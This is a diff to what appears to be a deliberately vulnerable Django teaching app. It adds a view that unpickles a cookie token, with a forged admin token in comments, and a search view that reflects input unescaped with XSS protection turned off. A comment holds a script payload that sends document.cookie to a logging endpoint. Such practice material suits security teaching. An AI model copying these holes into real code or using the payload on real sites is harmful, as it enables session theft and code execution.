@@ -63,3 +63,35 @@ print(encoded_user)
 # Admin token:
 # b'\x80\x03csecurity.views\nTestUser\nq\x00)\x81q\x01}q\x02X\x05\x00\x00\x00permsq\x03K\x01sb.'
 # b'gANjc2VjdXJpdHkudmlld3MKVGVzdFVzZXIKcQApgXEBfXECWAUAAABwZXJtc3EDSwFzYi4='
+def admin_index(request):
+    """Protected admin page which can be broken into by manipulating a token"""
+
+    token = base64.b64decode(request.COOKIES.get('silly_token', ''))
+    user = pickle.loads(token)
+
+    if user.perms == 1:
+        return HttpResponse('Hello Admin')
+
+    return HttpResponse('No access')
+
+
+# http://127.0.0.1:8000/security/search?query=%3Cscript%3Enew%20Image().src=%22http://127.0.0.1:8000/security/log?string=%22.concat(document.cookie)%3C/script%3E
+def search(request):
+    """Search functionality prone to XSS"""
+
+    query = request.GET.get('query', '')
+
+    response = HttpResponse(f"Query: {query}")
+
+    # Override browser's protection, if exsits
+    response['X-XSS-Protection'] = 0
+
+    return response
+
+def log(request):
+    """Just print whatever was received"""
+    string = request.GET.get('string', '')
+
+    print(string)
+
+    return HttpResponse()
